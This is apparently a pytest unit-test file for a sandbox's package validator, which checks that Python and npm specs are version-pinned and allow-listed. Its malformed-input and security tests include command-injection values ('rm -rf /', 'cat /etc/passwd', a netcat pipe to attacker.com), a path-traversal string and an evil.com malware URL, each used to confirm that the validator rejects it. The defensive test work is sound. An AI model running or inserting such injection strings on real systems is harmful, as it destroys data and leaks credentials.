"""Unit tests for package validator."""

import json
import re
from pathlib import Path

import pytest

from exec_sandbox.exceptions import ErrorCode, InvalidInputError
from exec_sandbox.models import Language
from exec_sandbox.package_validator import PackageValidator


def _no_version(spec: str) -> str:
    """The whole message (a `match` pattern) for `spec`, which has no version operator after
    a name."""
    return (
        "^"
        + re.escape(
            f"Invalid package spec: '{spec}'. Must include version specifier (e.g., pandas==2.0.0 or lodash@4.17.21)."
        )
        + r"\Z"
    )


def _not_allowed(name: str) -> str:
    """The whole message (a `match` pattern) for the package `name`, not in the python allow-list."""
    return (
        "^"
        + re.escape(
            f"Package '{name}' not in python allow-list. Only pre-approved packages from the catalog are permitted."
        )
        + r"\Z"
    )


@pytest.fixture
def temp_catalogs(tmp_path: Path) -> tuple[Path, Path]:
    """Create temporary catalog files for testing."""
    pypi_catalog = tmp_path / "pypi.json"
    npm_catalog = tmp_path / "npm.json"

    pypi_packages = ["pandas", "numpy", "requests"]
    npm_packages = ["lodash", "axios", "react"]

    pypi_catalog.write_text(json.dumps(pypi_packages))
    npm_catalog.write_text(json.dumps(npm_packages))

    return pypi_catalog, npm_catalog


@pytest.fixture
async def validator(temp_catalogs: tuple[Path, Path]) -> PackageValidator:
    """Create validator instance with test catalogs."""
    pypi_path, npm_path = temp_catalogs
    return await PackageValidator.create(
        pypi_allow_list_path=pypi_path,
        npm_allow_list_path=npm_path,
    )


async def test_valid_packages_python(validator: PackageValidator) -> None:
    """Test validation passes for allowed Python packages with version pins."""
    packages = [
        "pandas==2.0.0",
        "numpy==1.24.0",
        "requests==2.31.0",
    ]

    # Should not raise
    validator.validate(packages, language=Language.PYTHON)


async def test_valid_packages_javascript(validator: PackageValidator) -> None:
    """Test validation passes for allowed JavaScript packages with version pins."""
    packages = [
        "lodash@4.17.21",
        "axios@1.6.0",
        "react@18.2.0",
    ]

    # Should not raise
    validator.validate(packages, language=Language.JAVASCRIPT)


async def test_not_in_allowlist_raises(validator: PackageValidator) -> None:
    """Test validation fails for packages not in allow-list."""
    packages = ["malicious-package==1.0.0"]

    with pytest.raises(
        InvalidInputError,
        check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED,
        match=_not_allowed("malicious-package"),
    ):
        validator.validate(packages, language=Language.PYTHON)


async def test_no_version_pinning_raises(validator: PackageValidator) -> None:
    """Test validation fails for packages without version pinning."""
    # Python without version - validator requires version specifier
    with pytest.raises(
        InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version("pandas")
    ):
        validator.validate(["pandas"], language=Language.PYTHON)

    # JavaScript without version
    with pytest.raises(
        InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version("lodash")
    ):
        validator.validate(["lodash"], language=Language.JAVASCRIPT)


async def test_multiple_packages_first_fails(validator: PackageValidator) -> None:
    """Validation stops at the first invalid package: the error names it, not a later invalid one."""
    packages = [
        "pandas==2.0.0",  # Valid
        "malicious==1.0.0",  # Invalid - not in allow-list
        "evil==1.0.0",  # Invalid too, but not reached
    ]

    with pytest.raises(
        InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED, match=_not_allowed("malicious")
    ):
        validator.validate(packages, language=Language.PYTHON)


async def test_version_pinning_checked_before_allowlist(validator: PackageValidator) -> None:
    """A spec with no version and a name not in the allow-list is ARGUMENT_INVALID, not
    PACKAGE_NOT_ALLOWED: the format check comes first."""
    with pytest.raises(
        InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version("malicious")
    ):
        validator.validate(["malicious"], language=Language.PYTHON)


async def test_empty_package_list(validator: PackageValidator) -> None:
    """Test validation passes for empty package list."""
    # Should not raise
    validator.validate([], language=Language.PYTHON)
    validator.validate([], language=Language.JAVASCRIPT)


async def test_case_insensitive_package_names(validator: PackageValidator) -> None:
    """Test package name matching is case-insensitive."""
    # Uppercase version of allowed package should pass (case-insensitive)
    validator.validate(["PANDAS==2.0.0"], language=Language.PYTHON)
    validator.validate(["LODASH@4.17.21"], language=Language.JAVASCRIPT)
    validator.validate(["pAnDaS==2.0.0"], language=Language.PYTHON)  # Mixed case


# =============================================================================
# Python Version Specifier Tests
# =============================================================================


class TestPythonVersionSpecifiers:
    """Test various Python version specifier formats."""

    async def test_greater_than_or_equal(self, validator: PackageValidator) -> None:
        """Test >= version specifier."""
        validator.validate(["pandas>=2.0.0"], language=Language.PYTHON)

    async def test_less_than_or_equal(self, validator: PackageValidator) -> None:
        """Test <= version specifier."""
        validator.validate(["pandas<=2.0.0"], language=Language.PYTHON)

    async def test_greater_than(self, validator: PackageValidator) -> None:
        """Test > version specifier."""
        validator.validate(["pandas>2.0.0"], language=Language.PYTHON)

    async def test_less_than(self, validator: PackageValidator) -> None:
        """Test < version specifier."""
        validator.validate(["pandas<3.0.0"], language=Language.PYTHON)

    async def test_compatible_release(self, validator: PackageValidator) -> None:
        """Test ~= compatible release specifier."""
        validator.validate(["pandas~=2.0.0"], language=Language.PYTHON)

    async def test_not_equal(self, validator: PackageValidator) -> None:
        """The != exclusion specifier is refused: "!" is not a name character and no version operator starts with it."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version("pandas!=2.0.0")
        ):
            validator.validate(["pandas!=2.0.0"], language=Language.PYTHON)

    async def test_prerelease_version(self, validator: PackageValidator) -> None:
        """Test pre-release version formats."""
        validator.validate(["pandas==2.0.0rc1"], language=Language.PYTHON)
        validator.validate(["pandas==2.0.0a1"], language=Language.PYTHON)
        validator.validate(["pandas==2.0.0b2"], language=Language.PYTHON)

    async def test_dev_version(self, validator: PackageValidator) -> None:
        """Test dev version format."""
        validator.validate(["pandas==2.0.0.dev1"], language=Language.PYTHON)

    async def test_post_version(self, validator: PackageValidator) -> None:
        """Test post-release version format."""
        validator.validate(["pandas==2.0.0.post1"], language=Language.PYTHON)

    async def test_local_version(self, validator: PackageValidator) -> None:
        """Test local version identifier."""
        validator.validate(["pandas==2.0.0+local"], language=Language.PYTHON)


# =============================================================================
# JavaScript/npm Edge Cases
# =============================================================================


class TestJavaScriptEdgeCases:
    """Test JavaScript/npm specific edge cases."""

    async def test_scoped_package_not_supported(self, tmp_path: Path) -> None:
        """Test that scoped packages (@org/pkg) are NOT supported by current regex.

        This is a known limitation - the regex pattern ^([a-zA-Z0-9_\\-\\.]+)[@=<>~]
        doesn't match package names starting with @.
        """
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog.write_text(json.dumps(["@types/node"]))
        pypi_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )

        # Scoped packages fail because @ at start doesn't match the pattern
        with pytest.raises(
            InvalidInputError,
            check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID,
            match=_no_version("@types/node@18.0.0"),
        ):
            validator.validate(["@types/node@18.0.0"], language=Language.JAVASCRIPT)

    async def test_double_at_passes_extracts_name(self, validator: PackageValidator) -> None:
        """Test that double @@ extracts package name before first @.

        lodash@@4.17.21 -> regex matches 'lodash@', extracts 'lodash'.
        Since 'lodash' is in allowlist, this passes. The version '@4.17.21'
        is malformed but not validated by package_validator (handled by npm).
        """
        # This passes because 'lodash' is extracted and is in allowlist
        validator.validate(["lodash@@4.17.21"], language=Language.JAVASCRIPT)

    async def test_version_with_tag(self, validator: PackageValidator) -> None:
        """Test npm version tags like @latest, @next."""
        # These use @ which matches the pattern
        validator.validate(["lodash@latest"], language=Language.JAVASCRIPT)
        validator.validate(["lodash@next"], language=Language.JAVASCRIPT)

    async def test_version_range_npm(self, validator: PackageValidator) -> None:
        """Test npm version ranges."""
        validator.validate(["lodash@^4.17.0"], language=Language.JAVASCRIPT)
        validator.validate(["lodash@~4.17.0"], language=Language.JAVASCRIPT)


# =============================================================================
# Malformed Input Tests
# =============================================================================


class TestMalformedInputs:
    """Test handling of malformed and malicious inputs."""

    async def test_empty_string(self, validator: PackageValidator) -> None:
        """Test empty string package name."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version("")
        ):
            validator.validate([""], language=Language.PYTHON)

    async def test_whitespace_only(self, validator: PackageValidator) -> None:
        """Test whitespace-only package name."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version("   ")
        ):
            validator.validate(["   "], language=Language.PYTHON)

    async def test_only_version_specifier(self, validator: PackageValidator) -> None:
        """Test version specifier without package name."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version("==2.0.0")
        ):
            validator.validate(["==2.0.0"], language=Language.PYTHON)

    async def test_special_characters_in_name(self, validator: PackageValidator) -> None:
        """Test special characters that aren't allowed in package names."""
        invalid_specs = [
            "pandas!==2.0.0",  # ! not in allowed chars
            "pandas$==2.0.0",  # $ not allowed
            "pandas#==2.0.0",  # # not allowed
            "pandas%==2.0.0",  # % not allowed
            "pandas&==2.0.0",  # & not allowed
            "pandas*==2.0.0",  # * not allowed
        ]
        for spec in invalid_specs:
            with pytest.raises(
                InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version(spec)
            ):
                validator.validate([spec], language=Language.PYTHON)

    async def test_unicode_in_package_name(self, validator: PackageValidator) -> None:
        """Test unicode characters in package name."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version("pändäs==2.0.0")
        ):
            validator.validate(["pändäs==2.0.0"], language=Language.PYTHON)

    async def test_emoji_in_package_name(self, validator: PackageValidator) -> None:
        """Test emoji in package name."""
        with pytest.raises(
            InvalidInputError,
            check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID,
            match=_no_version("pandas🐼==2.0.0"),
        ):
            validator.validate(["pandas🐼==2.0.0"], language=Language.PYTHON)

    async def test_newline_in_package_spec(self, validator: PackageValidator) -> None:
        """Test newline injection attempt."""
        with pytest.raises(
            InvalidInputError,
            check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID,
            match=_no_version("pandas\n==2.0.0"),
        ):
            validator.validate(["pandas\n==2.0.0"], language=Language.PYTHON)

    async def test_null_byte_in_package_spec(self, validator: PackageValidator) -> None:
        """Test null byte injection attempt."""
        with pytest.raises(
            InvalidInputError,
            check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID,
            match=_no_version("pandas\x00==2.0.0"),
        ):
            validator.validate(["pandas\x00==2.0.0"], language=Language.PYTHON)

    async def test_very_long_package_name(self, validator: PackageValidator) -> None:
        """Test extremely long package name."""
        # Should fail on allowlist check (not in list), not crash
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED, match=_not_allowed("a" * 10000)
        ):
            validator.validate(["a" * 10000 + "==1.0.0"], language=Language.PYTHON)

    async def test_path_traversal_attempt(self, validator: PackageValidator) -> None:
        """Test path traversal in package name."""
        # Dots are allowed in package names, so ../../../ would parse
        # but wouldn't be in allowlist
        # The dots and slashes - slash not allowed, so invalid spec
        with pytest.raises(
            InvalidInputError,
            check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID,
            match=_no_version("../../../etc/passwd==1.0"),
        ):
            validator.validate(["../../../etc/passwd==1.0"], language=Language.PYTHON)

    async def test_command_injection_attempt(self, validator: PackageValidator) -> None:
        """Test command injection patterns."""
        injection_attempts = [
            "pandas; rm -rf /==1.0",
            "pandas && cat /etc/passwd==1.0",
            "pandas | nc attacker.com==1.0",
            "pandas`whoami`==1.0",
            "pandas$(whoami)==1.0",
        ]
        for attempt in injection_attempts:
            with pytest.raises(
                InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version(attempt)
            ):
                validator.validate([attempt], language=Language.PYTHON)


# =============================================================================
# Package Name Format Tests
# =============================================================================


class TestPackageNameFormats:
    """Test various valid package name formats."""

    async def test_package_with_hyphen(self, tmp_path: Path) -> None:
        """Test package names with hyphens."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text(json.dumps(["scikit-learn"]))
        npm_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )
        validator.validate(["scikit-learn==1.0.0"], language=Language.PYTHON)

    async def test_package_with_underscore(self, tmp_path: Path) -> None:
        """Test package names with underscores."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text(json.dumps(["my_package"]))
        npm_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )
        validator.validate(["my_package==1.0.0"], language=Language.PYTHON)

    async def test_package_with_dots(self, tmp_path: Path) -> None:
        """Test package names with dots."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text(json.dumps(["zope.interface"]))
        npm_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )
        validator.validate(["zope.interface==5.0.0"], language=Language.PYTHON)

    async def test_package_with_numbers(self, tmp_path: Path) -> None:
        """Test package names with numbers."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text(json.dumps(["py3dns", "oauth2client"]))
        npm_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )
        validator.validate(["py3dns==1.0.0"], language=Language.PYTHON)
        validator.validate(["oauth2client==4.0.0"], language=Language.PYTHON)

    async def test_single_character_package(self, tmp_path: Path) -> None:
        """Test single character package names."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text(json.dumps(["q", "x"]))
        npm_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )
        validator.validate(["q==1.0.0"], language=Language.PYTHON)

    async def test_numeric_only_package_name(self, tmp_path: Path) -> None:
        """Test numeric-only package names (rare but valid)."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text(json.dumps(["123"]))
        npm_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )
        validator.validate(["123==1.0.0"], language=Language.PYTHON)

    async def test_python_extras_syntax(self, validator: PackageValidator) -> None:
        """Test Python extras syntax like requests[security].

        Note: Current implementation doesn't handle extras - the [ character
        is not in the allowed pattern, so this will fail.
        """
        # [ is not in the pattern, so it fails to parse
        with pytest.raises(
            InvalidInputError,
            check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID,
            match=_no_version("requests[security]==2.31.0"),
        ):
            validator.validate(["requests[security]==2.31.0"], language=Language.PYTHON)


# =============================================================================
# Invalid Package Name Format Tests (Defense in Depth)
# =============================================================================


class TestInvalidPackageNameFormats:
    """Test that invalid package name formats are caught by allowlist.

    These test cases document behavior where the regex pattern accepts
    technically malformed package names, but the allowlist provides
    defense in depth by rejecting them.

    PyPI naming rules: Must start with letter or number, can contain
    letters, numbers, hyphens, underscores, periods.

    npm naming rules: Cannot start with dot or underscore (except scoped).
    """

    async def test_name_starting_with_underscore(self, validator: PackageValidator) -> None:
        """Underscores at start are invalid for PyPI/npm but pass regex."""
        # Passes regex, fails allowlist
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED, match=_not_allowed("_private")
        ):
            validator.validate(["_private==1.0.0"], language=Language.PYTHON)

    async def test_name_starting_with_hyphen(self, validator: PackageValidator) -> None:
        """Hyphens at start are invalid for PyPI/npm but pass regex."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED, match=_not_allowed("-pkg")
        ):
            validator.validate(["-pkg==1.0.0"], language=Language.PYTHON)

    async def test_name_starting_with_dot(self, validator: PackageValidator) -> None:
        """Dots at start are invalid for PyPI/npm but pass regex."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED, match=_not_allowed(".hidden")
        ):
            validator.validate([".hidden==1.0.0"], language=Language.PYTHON)

    async def test_name_only_dots(self, validator: PackageValidator) -> None:
        """Names with only dots are invalid but pass regex."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED, match=_not_allowed("...")
        ):
            validator.validate(["...==1.0.0"], language=Language.PYTHON)

    async def test_name_only_underscores(self, validator: PackageValidator) -> None:
        """Names with only underscores are invalid but pass regex."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED, match=_not_allowed("___")
        ):
            validator.validate(["___==1.0.0"], language=Language.PYTHON)

    async def test_name_only_hyphens(self, validator: PackageValidator) -> None:
        """Names with only hyphens are invalid but pass regex."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED, match=_not_allowed("---")
        ):
            validator.validate(["---==1.0.0"], language=Language.PYTHON)

    async def test_trailing_space_before_specifier(self, validator: PackageValidator) -> None:
        """Trailing space before specifier fails regex (good behavior)."""
        # Space breaks the pattern, so "Invalid package spec"
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version("pandas ==1.0.0")
        ):
            validator.validate(["pandas ==1.0.0"], language=Language.PYTHON)

    async def test_leading_space_in_name(self, validator: PackageValidator) -> None:
        """Leading space in name fails regex."""
        with pytest.raises(
            InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID, match=_no_version(" pandas==1.0.0")
        ):
            validator.validate([" pandas==1.0.0"], language=Language.PYTHON)


# =============================================================================
# Security-Focused Tests
# =============================================================================


class TestSecurityCases:
    """Security-focused test cases."""

    async def test_typosquatting_not_in_allowlist(self, validator: PackageValidator) -> None:
        """Test that typosquatting attempts fail (not in allowlist)."""
        typosquats = [
            "pandass",  # Extra 's'
            "panda",  # Missing 's'
            "panadas",  # Transposed
            "pandas2",  # Added number
            "numppy",  # Extra 'p'
            "requets",  # Missing 's'
        ]
        for typo in typosquats:
            with pytest.raises(
                InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED, match=_not_allowed(typo)
            ):
                validator.validate([f"{typo}==2.0.0"], language=Language.PYTHON)

    async def test_homoglyph_attack(self, validator: PackageValidator) -> None:
        """Test homoglyph/lookalike character attacks."""
        # These use characters that look similar but are different
        # Most will fail on invalid spec since they use non-ASCII
        homoglyphs = [
            "pаndas==2.0.0",  # noqa: RUF001, RUF003 - Intentional Cyrillic 'а'
            "pandаs==2.0.0",  # noqa: RUF001, RUF003 - Intentional Cyrillic 'а'
        ]
        for attack in homoglyphs:
            with pytest.raises(InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID):
                validator.validate([attack], language=Language.PYTHON)

    async def test_allowlist_bypass_case_sensitivity(self, tmp_path: Path) -> None:
        """Verify case-insensitive matching prevents bypasses."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text(json.dumps(["Pandas"]))  # Mixed case in catalog
        npm_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )

        # All case variations should work
        validator.validate(["pandas==2.0.0"], language=Language.PYTHON)
        validator.validate(["PANDAS==2.0.0"], language=Language.PYTHON)
        validator.validate(["PaNdAs==2.0.0"], language=Language.PYTHON)

    async def test_multiple_version_specifiers_in_one(self, validator: PackageValidator) -> None:
        """Test complex version specifiers."""
        # The regex only looks for the first specifier character
        # pandas>=2.0.0,<3.0.0 - the package name is correctly extracted as 'pandas'
        validator.validate(["pandas>=2.0.0,<3.0.0"], language=Language.PYTHON)

    async def test_url_in_package_spec(self, validator: PackageValidator) -> None:
        """Test URL-based package specs are rejected."""
        with pytest.raises(InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID):
            validator.validate(
                ["https://evil.com/malware.tar.gz"],
                language=Language.PYTHON,
            )

    async def test_git_url_in_package_spec(self, validator: PackageValidator) -> None:
        """Test git URL package specs are rejected."""
        with pytest.raises(InvalidInputError, check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID):
            validator.validate(
                ["git+https://github.com/user/repo.git"],
                language=Language.PYTHON,
            )


# =============================================================================
# Language Type Handling Tests
# =============================================================================


class TestLanguageTypeHandling:
    """Test that validate() handles Language enum correctly and rejects unsupported languages."""

    async def test_raw_language_raises_clear_error(self, validator: PackageValidator) -> None:
        """Language.RAW has no allow-list and should raise a descriptive error."""
        with pytest.raises(
            InvalidInputError,
            check=lambda e: e.code is ErrorCode.ARGUMENT_INVALID,
            match=r"^Package validation not supported for 'raw' language\. Supported: javascript, python\.\Z",
        ):
            validator.validate(["some-pkg==1.0.0"], language=Language.RAW)


# =============================================================================
# Factory Method (create) Tests
# =============================================================================


class TestPackageValidatorCreate:
    """Test PackageValidator.create() factory method."""

    async def test_create_with_nonexistent_file_raises(self, tmp_path: Path) -> None:
        """Test that non-existent catalog file raises FileNotFoundError."""
        with pytest.raises(FileNotFoundError):
            await PackageValidator.create(
                pypi_allow_list_path=tmp_path / "nonexistent.json",
                npm_allow_list_path=tmp_path / "also_nonexistent.json",
            )

    async def test_create_with_empty_catalog(self, tmp_path: Path) -> None:
        """Test that empty catalog rejects all packages."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text(json.dumps([]))
        npm_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )

        # With empty catalog, ALL packages should fail
        with pytest.raises(InvalidInputError, check=lambda e: e.code is ErrorCode.PACKAGE_NOT_ALLOWED):
            validator.validate(["pandas==2.0.0"], language=Language.PYTHON)

    async def test_create_with_invalid_json_raises(self, tmp_path: Path) -> None:
        """Test that invalid JSON in catalog file raises error."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text("not valid json {{{")
        npm_catalog.write_text("[]")

        with pytest.raises(json.JSONDecodeError):
            await PackageValidator.create(
                pypi_allow_list_path=pypi_catalog,
                npm_allow_list_path=npm_catalog,
            )

    async def test_create_uses_default_paths(self) -> None:
        """With no paths, create() loads the catalogs shipped in the package."""
        # Should not raise - uses default bundled catalogs
        validator = await PackageValidator.create()

        # Should have loaded real packages from catalogs
        validator.validate(["pandas==2.0.0"], language=Language.PYTHON)
        validator.validate(["lodash@4.17.21"], language=Language.JAVASCRIPT)

    async def test_create_with_duplicate_packages_in_catalog(self, tmp_path: Path) -> None:
        """A name that the catalog lists more than once, in any case, is still allowed."""
        pypi_catalog = tmp_path / "pypi.json"
        npm_catalog = tmp_path / "npm.json"
        pypi_catalog.write_text(json.dumps(["pandas", "pandas", "PANDAS"]))
        npm_catalog.write_text(json.dumps([]))

        validator = await PackageValidator.create(
            pypi_allow_list_path=pypi_catalog,
            npm_allow_list_path=npm_catalog,
        )

        # Should work despite duplicates
        validator.validate(["pandas==2.0.0"], language=Language.PYTHON)
        validator.validate(["PANDAS==2.0.0"], language=Language.PYTHON)
